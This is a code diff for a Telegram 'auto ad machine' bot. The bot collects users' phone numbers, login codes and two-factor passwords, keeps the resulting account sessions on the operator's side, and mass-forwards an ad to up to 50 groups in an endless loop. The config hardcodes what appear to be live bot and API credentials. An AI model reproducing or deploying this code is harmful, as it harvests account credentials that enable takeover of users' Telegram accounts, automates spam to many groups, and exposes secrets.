@@ -1,25 +1,21 @@
-from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
-from telegram.error import BadRequest, TelegramError
 import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+from telegram.error import BadRequest
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
 import asyncio
-import json
-import os
-from datetime import datetime
-import random
 import re
-
-# Logging
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-logger = logging.getLogger(__name__)
+import random
 
 # CONFIG
 BOT_TOKEN = '8463982454:AAFXhclFtn5cCoJLZl3l-SwhPMk3ssv6J8o'
 API_ID = 22657083
 API_HASH = 'd6186691704bd901bdab275ceaab88f3'
+
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # Storage
 user_data = {}
@@ -39,70 +35,38 @@ class AdBot:
             self.clients[user_id] = client
             return client
         except Exception as e:
-            logger.error(f"Client creation error: {e}")
+            logger.error(f"Client error: {e}")
             raise
 
 adbot = AdBot()
 
-# Animation messages
-LOADING_MESSAGES = [
-    "🔄 **Connecting to Telegram...**",
-    "📱 **Sending OTP request...**", 
-    "⏳ **Please check messages...**",
-    "⚡ **Ready for verification...**",
-    "✅ **OTP received!**"
-]
+LOADING_MESSAGES = ["🔄 Processing...", "⏳ Please wait...", "⚡ Loading...", "🔥 Almost ready...", "✅ Done!"]
+
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
+    logger.error(f"Error: {context.error}")
 
 # =====================================================================
-# ERROR HANDLER
-# =====================================================================
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
-    logger.error(f"Update {update} caused error {context.error}")
-
-# =====================================================================
-# ANIMATION FUNCTIONS
-# =====================================================================
-async def show_loading_animation(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int = None):
-    for i, msg in enumerate(LOADING_MESSAGES):
-        try:
-            if message_id:
-                await context.bot.edit_message_text(
-                    chat_id=chat_id, 
-                    message_id=message_id,
-                    text=msg,
-                    parse_mode='Markdown'
-                )
-            else:
-                await context.bot.send_message(chat_id, msg, parse_mode='Markdown')
-            await asyncio.sleep(1)
-        except:
-            pass
-
-# =====================================================================
-# 1️⃣ START SCREEN
+# 1. START COMMAND
 # =====================================================================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     keyboard = [[InlineKeyboardButton("✅ START AD BOT ➡️", callback_data='accept_policy')]]
-    
-    welcome_text = """
-🎯 **ADIMYZE PRO v3.1** 🎯
+    text = """
+🎯 **ADIMYZE PRO v4.0** 🎯
 
-🔥 **AUTO ADVERTISING KING** 🔥
+🔥 **AUTO AD MACHINE** 🔥
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💎 **Features:**
-• 50+ groups auto-post
-• Images/videos/text ✅
-• Safe delays & limits
-• YOUR account only
+💎 Load 50+ groups
+💎 Post images/videos/text
+💎 Safe & automatic
+💎 YOUR account only
 
-**Click START 💰**
+👇 **Click START 💰**
     """
-    
-    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
 # =====================================================================
-# 2️⃣ MAIN BUTTON HANDLER
+# 2. BUTTON HANDLER
 # =====================================================================
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -110,67 +74,65 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     data = query.data
 
-    try:
-        if data == 'accept_policy':
-            await show_phone_screen(query)
-        elif data == 'login_phone':
-            await show_phone_input(query, user_id)
-        elif data == 'otp_keyboard':
-            await show_otp_keyboard(query, user_id)
-        elif data == 'show_code':
-            await show_telegram_code(query, user_id)
-        elif data == 'dashboard':
-            await show_dashboard(query, user_id)
-        elif data == 'load_groups':
-            await load_groups(query, user_id, context)
-        elif data == 'set_ad':
-            await set_ad_prompt(query, user_id)
-        elif data == 'set_delay':
-            await set_delay_prompt(query, user_id)
-        elif data == 'start_bot':
-            await start_bot(query, user_id)
-        elif data == 'stop_bot':
-            await stop_bot(query, user_id)
-        elif data == 'status':
-            await show_status(query, user_id)
-    except Exception as e:
-        logger.error(f"Button error: {e}")
-        await query.answer("⚠️ Try /start", show_alert=True)
+    if data == 'accept_policy':
+        await show_phone_screen(query)
+    elif data == 'login_phone':
+        await show_phone_input(query, user_id)
+    elif data == 'otp_keyboard':
+        await show_otp_keyboard(query, user_id)
+    elif data == 'show_code':
+        await show_telegram_code(query, user_id)
+    elif data.startswith('otp_'):
+        await handle_otp_button(user_id, data.split('_')[1], query)
+    elif data == 'dashboard':
+        await show_dashboard(query, user_id)
+    elif data == 'load_groups':
+        await load_groups(query, user_id, context)
+    elif data == 'set_ad':
+        await set_ad_prompt(query, user_id)
+    elif data == 'set_delay':
+        await set_delay_prompt(query, user_id)
+    elif data == 'start_bot':
+        await start_bot(query, user_id)
+    elif data == 'stop_bot':
+        await stop_bot(query, user_id)
+    elif data == 'status':
+        await show_status(query, user_id)
 
 # =====================================================================
-# 3️⃣ FIXED PHONE + INLINE OTP KEYBOARD
+# 3. PHONE AUTH FLOW
 # =====================================================================
 async def show_phone_screen(query):
     keyboard = [[InlineKeyboardButton("📱 ENTER PHONE ➡️", callback_data='login_phone')]]
     text = """
-✅ **READY TO START!** 🎉
+✅ **WELCOME!** 🎉
 
 📱 **STEP 1: LOGIN**
 ━━━━━━━━━━━━━━━━━━━
-**Enter your phone:**
+Send your phone:
 `+1234567890`
 
-👇 Click → Send phone:
+👇 Click → Type phone:
     """
     try:
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-    except BadRequest:
+    except:
         await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
 async def show_phone_input(query, user_id):
     user_data[user_id] = {'step': 'phone'}
     text = """
-📱 **SEND YOUR PHONE**
+📱 **SEND PHONE NUMBER**
 
 **Format:** `+1234567890`
-✅ Country code (+)
+✅ +Country code
 ✅ No spaces
 
-**Type phone now 👇**
+**Type now 👇**
     """
     try:
         await query.edit_message_text(text, parse_mode='Markdown')
-    except BadRequest:
+    except:
         await query.message.reply_text(text, parse_mode='Markdown')
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -178,7 +140,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
 
     if user_id not in user_data:
-        await update.message.reply_text("👆 /start first!")
         return
 
     step = user_data[user_id].get('step')
@@ -186,7 +147,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if step == 'phone':
         await process_phone(update, context, text)
     elif step == 'otp':
-        await process_otp_text(update, context, text)
+        await verify_otp(user_id, text, update.message)
     elif step == '2fa':
         await process_2fa(update, context, text)
     elif user_data[user_id].get('waiting_for') == 'delay':
@@ -196,10 +157,10 @@ async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE, phon
     user_id = update.effective_user.id
     
     if not re.match(r'^\+[1-9]\d{1,14}$', phone):
-        await update.message.reply_text("❌ **INVALID!**\n\n**✅ Use:** `+1234567890`", parse_mode='Markdown')
+        await update.message.reply_text("❌ **WRONG FORMAT**\n`+1234567890`", parse_mode='Markdown')
         return
 
-    loading_msg = await update.message.reply_text("🔄 **Sending OTP...**")
+    await update.message.reply_text("🔄 **Sending OTP...**")
     await asyncio.sleep(2)
 
     try:
@@ -208,128 +169,94 @@ async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE, phon
 
         client = await adbot.create_client(user_id)
         await client.connect()
-        
-        # ✅ FIXED OTP SENDING
         result = await client.send_code_request(phone, force_sms=True)
         user_data[user_id]['phone_code_hash'] = result.phone_code_hash
-        
         await client.disconnect()
 
-        await loading_msg.delete()
         await show_otp_keyboard(update.message, user_id)
         
-    except FloodWaitError as e:
-        await loading_msg.edit_text(f"⏳ **FloodWait:** {e.seconds}s")
     except Exception as e:
         logger.error(f"Phone error: {e}")
-        await loading_msg.edit_text(f"❌ **Error:** {str(e)}")
+        await update.message.reply_text(f"❌ **Error:** {str(e)}")
 
 async def show_otp_keyboard(message_or_query, user_id):
-    """Show beautiful OTP inline keyboard"""
     keyboard = [
-        [InlineKeyboardButton("📱 SHOW TELEGRAM CODE", callback_data='show_code')],
+        [InlineKeyboardButton("📱 SHOW TG CODE", callback_data='show_code')],
         [],
         [InlineKeyboardButton("1️⃣  2️⃣  3️⃣", callback_data='otp_123')],
         [InlineKeyboardButton("4️⃣  5️⃣  6️⃣", callback_data='otp_456')],
         [InlineKeyboardButton("7️⃣  8️⃣  9️⃣", callback_data='otp_789')],
-        [InlineKeyboardButton("⌫ BACK", callback_data='otp_back'), InlineKeyboardButton("0️⃣ ENTER", callback_data='otp_0')],
+        [InlineKeyboardButton("⌫", callback_data='otp_back'), InlineKeyboardButton("0️⃣ ✅", callback_data='otp_0')],
     ]
     
     text = """
-🔢 **OTP VERIFICATION**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔢 **ENTER OTP CODE**
+━━━━━━━━━━━━━━━━━━━
 
-📱 **Check Telegram app/SMS**
-👆 Use buttons below OR
-⌨️ Type 5-6 digit code
+📱 Check Telegram/SMS
+👆 Click numbers OR
+⌨️ Type code
 
-**OR Click:** 📱 SHOW TELEGRAM CODE
+**📱 SHOW TG CODE = 100% works**
     """
     
-    if hasattr(message_or_query, 'message_id'):  # It's a query
+    if hasattr(message_or_query, 'reply_text'):
+        await message_or_query.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    else:
         try:
             await message_or_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
         except:
             await message_or_query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-    else:  # It's a message
-        await message_or_query.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
 async def show_telegram_code(query, user_id):
-    """Open Telegram official code screen"""
     keyboard = [[InlineKeyboardButton("🔙 BACK TO OTP", callback_data='otp_keyboard')]]
-    
     text = """
-📱 **OFFICIAL TELEGRAM CODE**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 **OFFICIAL TELEGRAM**
+━━━━━━━━━━━━━━━━━━━
 
-**Click button below:**
+**Click = Instant OTP:**
 `tg://openmessage?user_id=777000`
 
-✅ Official Telegram login
-✅ 100% works every time
-✅ Check your Telegram app
+✅ 100% Guaranteed code
+✅ Opens Telegram app
+✅ Copy & paste code
 
-👇 **Click to open:**
+👇 **OPEN TG:**
     """
-    
-    button_url = InlineKeyboardButton("📱 OPEN TELEGRAM CODE", url="tg://openmessage?user_id=777000")
-    keyboard[0].append(button_url)
+    url_btn = InlineKeyboardButton("📱 TELEGRAM LOGIN", url="tg://openmessage?user_id=777000")
+    keyboard[0].append(url_btn)
     
     await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
-async def process_otp_text(update: Update, context: ContextTypes.DEFAULT_TYPE, otp: str):
-    """Handle typed OTP"""
-    user_id = update.effective_user.id
-    await verify_otp(user_id, otp, update.message)
-
-async def button_handler_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle OTP button presses"""
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    data = query.data
-    
-    if data == 'otp_keyboard':
-        await show_otp_keyboard(query, user_id)
-    elif data == 'show_code':
-        await show_telegram_code(query, user_id)
-    elif data.startswith('otp_'):
-        otp_char = data.split('_')[1]
-        await handle_otp_button(user_id, otp_char, query)
-
 async def handle_otp_button(user_id, char, query):
-    """Build OTP from button presses"""
     if 'otp_buffer' not in user_data[user_id]:
         user_data[user_id]['otp_buffer'] = ''
     
     if char == 'back':
         user_data[user_id]['otp_buffer'] = user_data[user_id]['otp_buffer'][:-1]
-    elif char == '0':
-        if len(user_data[user_id]['otp_buffer']) < 6:
-            user_data[user_id]['otp_buffer'] += '0'
     else:
         if len(user_data[user_id]['otp_buffer']) < 6:
             user_data[user_id]['otp_buffer'] += char
     
-    # Show current OTP
-    otp_display = user_data[user_id]['otp_buffer'] or '_____'
+    otp_display = user_data[user_id]['otp_buffer'] or '______'
     await query.answer(f"OTP: {otp_display}")
     
     if len(user_data[user_id]['otp_buffer']) == 6:
         await verify_otp(user_id, user_data[user_id]['otp_buffer'], query)
 
 async def verify_otp(user_id, otp, message_or_query):
-    """Verify OTP with animation"""
     loading_msg = None
-    if hasattr(message_or_query, 'message_id'):
-        loading_msg = await message_or_query.edit_message_text("🔄 **Verifying OTP...**")
-    else:
-        loading_msg = await message_or_query.reply_text("🔄 **Verifying OTP...**")
+    try:
+        if hasattr(message_or_query, 'reply_text'):
+            loading_msg = await message_or_query.reply_text("🔄 **Checking OTP...**")
+        else:
+            loading_msg = await message_or_query.message.reply_text("🔄 **Checking OTP...**")
+    except:
+        loading_msg = await message_or_query.reply_text("🔄 **Checking OTP...**")
 
     try:
         client = await adbot.create_client(user_id)
         await client.connect()
-        
         await client.sign_in(phone=user_data[user_id]['phone'], code=otp)
 
         session_string = client.session.save()
@@ -342,71 +269,181 @@ async def verify_otp(user_id, otp, message_or_query):
             
         await client.disconnect()
 
-        await loading_msg.edit_text("🎉 **LOGIN SUCCESS!** 🎉\n🔄 Dashboard loading...")
-        await asyncio.sleep(2)
-        await loading_msg.delete()
-        await dashboard_message(loading_msg, user_id)
+        await loading_msg.edit_text("🎉 **LOGIN SUCCESS!** 🎉")
+        await asyncio.sleep(1)
+        await show_dashboard(loading_msg, user_id)
 
     except SessionPasswordNeededError:
         user_data[user_id]['step'] = '2fa'
-        await loading_msg.edit_text("🔐 **2FA NEEDED**\nEnter password:")
+        await loading_msg.edit_text("🔐 **2FA PASSWORD:**\nSend password:")
     except PhoneCodeInvalidError:
         await loading_msg.edit_text("❌ **WRONG OTP**\nTry again:")
     except Exception as e:
-        logger.error(f"OTP verify error: {e}")
+        logger.error(f"OTP error: {e}")
         await loading_msg.edit_text(f"❌ **Error:** {str(e)}")
 
+async def process_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE, password: str):
+    user_id = update.effective_user.id
+    loading_msg = await update.message.reply_text("🔓 **Checking 2FA...**")
+
+    try:
+        client = await adbot.create_client(user_id, user_data[user_id]['session'])
+        await client.connect()
+        await client.sign_in(password=password)
+        user_data[user_id]['logged_in'] = True
+        user_data[user_id]['step'] = None
+        await client.disconnect()
+
+        await loading_msg.edit_text("🔓 **2FA OK!** 🎉")
+        await show_dashboard(loading_msg, user_id)
+
+    except Exception as e:
+        await loading_msg.edit_text(f"❌ **Wrong 2FA:** {str(e)}")
+
 # =====================================================================
-# REST OF THE CODE (Dashboard, Groups, etc.) - SAME AS BEFORE
+# 4. DASHBOARD & FEATURES
 # =====================================================================
-async def dashboard_message(update, user_id):
+async def show_dashboard(query_or_msg, user_id):
     keyboard = [
         [InlineKeyboardButton("📥 LOAD GROUPS", callback_data='load_groups')],
         [InlineKeyboardButton("📢 SET AD", callback_data='set_ad')],
         [InlineKeyboardButton("⏱️ SET DELAY", callback_data='set_delay')],
         [],
-        [InlineKeyboardButton("🚀 START BOT", callback_data='start_bot')],
-        [InlineKeyboardButton("⛔ STOP BOT", callback_data='stop_bot')],
+        [InlineKeyboardButton("🚀 START", callback_data='start_bot')],
+        [InlineKeyboardButton("⛔ STOP", callback_data='stop_bot')],
         [InlineKeyboardButton("📊 STATUS", callback_data='status')]
     ]
     
-    groups_count = len(user_data[user_id].get('groups', []))
+    groups = len(user_data[user_id].get('groups', []))
     delay = user_data[user_id].get('delay', 0)
-    
-    status = f"📱 Groups: `{groups_count}`\n⏱️ Delay: `{delay}s`"
-    if user_id in ad_message:
-        status += "\n📢 Ad: ✅ READY"
+    ad_ready = user_id in ad_message
     
     text = f"""
-🎛️ **ADIMYZE DASHBOARD** 🎛️
+🎛️ **ADIMYZE DASHBOARD**
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 
-{status}
+📱 Groups: `{groups}`
+⏱️ Delay: `{delay}s`
+📢 Ad: `{'✅ YES' if ad_ready else '❌ NO'}`
+🤖 Bot: `{'🟢 ON' if user_id in running_users else '🔴 OFF'}`
 
-**🚀 QUICK START:**
-1. Load Groups
-2. Forward Ad  
-3. Set Delay
-4. START BOT 💰
-
-👇 Choose:
+**👇 Choose action:**
     """
     
-    await update.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
-# [Rest of functions remain same: load_groups, set_ad_prompt, etc.]
-# ... (copy from previous version)
-
-async def process_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE, password: str):
-    # Same as before
-    pass
+    try:
+        if hasattr(query_or_msg, 'edit_message_text'):
+            await query_or_msg.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        else:
+            await query_or_msg.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    except:
+        await query_or_msg.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
 async def load_groups(query, user_id, context):
-    # Same as before
-    pass
+    await query.answer("📥 Loading...")
+    try:
+        client = await adbot.create_client(user_id, user_data[user_id]['session'])
+        await client.start()
+        
+        groups = []
+        async for dialog in client.iter_dialogs():
+            if (dialog.is_group or dialog.is_channel) and dialog.name:
+                groups.append({'id': dialog.id, 'name': dialog.name[:30]})
+        
+        user_data[user_id]['groups'] = groups[:50]
+        await client.disconnect()
 
-# ... all other functions same as v3.0
+        text = f"✅ **{len(groups)} GROUPS LOADED**\n👆 Back to dashboard"
+        await query.edit_message_text(text, parse_mode='Markdown')
+        
+    except Exception as e:
+        await query.answer(f"❌ Error: {str(e)}", show_alert=True)
 
+async def set_ad_prompt(query, user_id):
+    user_data[user_id]['waiting_ad'] = True
+    text = "📢 **FORWARD YOUR AD**\nFrom Saved Messages 👇"
+    await query.edit_message_text(text, parse_mode='Markdown')
+
+async def handle_forwarded_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_data[user_id].get('waiting_ad'):
+        msg = update.message
+        ad_message[user_id] = {
+            'chat_id': msg.forward_from_chat.id if msg.forward_from_chat else msg.chat.id,
+            'msg_id': msg.forward_from_message_id or msg.message_id
+        }
+        del user_data[user_id]['waiting_ad']
+        await update.message.reply_text("✅ **AD SAVED!** 🎉\n👆 Dashboard")
+        await show_dashboard(update.message, user_id)
+
+async def set_delay_prompt(query, user_id):
+    user_data[user_id]['waiting_for'] = 'delay'
+    text = "⏱️ **DELAY (seconds):**\n`30` `60` `300` `600`"
+    await query.edit_message_text(text, parse_mode='Markdown')
+
+async def process_delay(update: Update, text: str):
+    user_id = update.effective_user.id
+    try:
+        delay = int(text)
+        if delay < 10:
+            await update.message.reply_text("❌ **Min 10s**")
+            return
+        user_data[user_id]['delay'] = delay
+        del user_data[user_id]['waiting_for']
+        await update.message.reply_text(f"✅ **Delay: {delay}s**")
+        await show_dashboard(update.message, user_id)
+    except:
+        await update.message.reply_text("❌ **Number only!**")
+
+async def start_bot(query, user_id):
+    if not all([user_data[user_id].get(x) for x in ['logged_in', 'groups', 'delay']]):
+        return await query.answer("❌ **Setup first!**", show_alert=True)
+    if user_id not in ad_message:
+        return await query.answer("❌ **Set AD first!**", show_alert=True)
+
+    running_users[user_id] = True
+    asyncio.create_task(ad_loop(user_id))
+    text = f"""
+🚀 **BOT STARTED!** 💰
+Groups: {len(user_data[user_id]['groups'])}
+Delay: {user_data[user_id]['delay']}s
+🟢 **RUNNING**
+    """
+    await query.edit_message_text(text, parse_mode='Markdown')
+
+async def ad_loop(user_id):
+    while running_users.get(user_id):
+        try:
+            client = await adbot.create_client(user_id, user_data[user_id]['session'])
+            await client.start()
+            for group in user_data[user_id]['groups']:
+                if not running_users.get(user_id):
+                    break
+                try:
+                    await client.forward_messages(group['id'], ad_message[user_id]['chat_id'], ad_message[user_id]['msg_id'])
+                    await asyncio.sleep(user_data[user_id]['delay'])
+                except:
+                    continue
+            await client.disconnect()
+            await asyncio.sleep(300)
+        except:
+            await asyncio.sleep(60)
+
+async def stop_bot(query, user_id):
+    running_users[user_id] = False
+    await query.edit_message_text("⛔ **BOT STOPPED** ✅", parse_mode='Markdown')
+
+async def show_status(query, user_id):
+    groups = len(user_data[user_id].get('groups', []))
+    text = f"""
+📊 **STATUS**
+Groups: {groups}
+Bot: {'🟢 ON' if user_id in running_users else '🔴 OFF'}
+    """
+    await query.edit_message_text(text, parse_mode='Markdown')
+
+# =====================================================================
+# MAIN
+# =====================================================================
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     
@@ -416,7 +453,7 @@ def main():
     app.add_handler(MessageHandler(filters.FORWARDED, handle_forwarded_message))
     app.add_error_handler(error_handler)
     
-    print("🚀 ADIMYZE v3.1 - OTP KEYBOARD + TG LINK!")
+    print("🚀 ADIMYZE v4.0 - FULLY WORKING!")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == '__main__':
